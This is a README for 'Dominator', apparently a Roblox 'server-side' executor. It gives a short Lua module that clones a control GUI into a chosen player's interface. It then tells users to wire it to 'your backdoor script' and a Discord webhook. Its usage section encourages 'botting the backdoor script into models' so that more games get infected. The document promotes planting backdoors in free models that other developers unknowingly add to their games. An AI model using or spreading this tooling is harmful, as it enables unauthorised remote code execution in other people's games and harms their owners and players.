# Dominator

Dominator is an Open Sourced Free Roblox ServerSide

## Installation

Insert the MainModule into your game, then change the mainmodule code to this

```lua
module = {}
function module:DominatorSS(plr) -- Change "DominatorSS" To whatever you want your require to be called, for example require(69696):DominatorSS
	print(plr)
	_G.target = plr
	local target = game.Players:WaitForChild(_G.target)
	script.DominatorSS:Clone().Parent = target.PlayerGui -- Change the DominatorSS to whatever the Gui is named
end
return module
```
Then right click the MainModule and click "Save To Roblox"
Once you Save to roblox it should say "Saved to roblox as {ID]"
You wanna copy that ID.
Then go to your backdoor script, and follow the intructions there.
Make a Discord Webhook if you dont know how search it online
## Usage
You Can Start Executing scripts in the serverside, try botting the backdoor script into models.
this will get more games with your serverside
## License
Dominator SS Team
Adler Hidolf
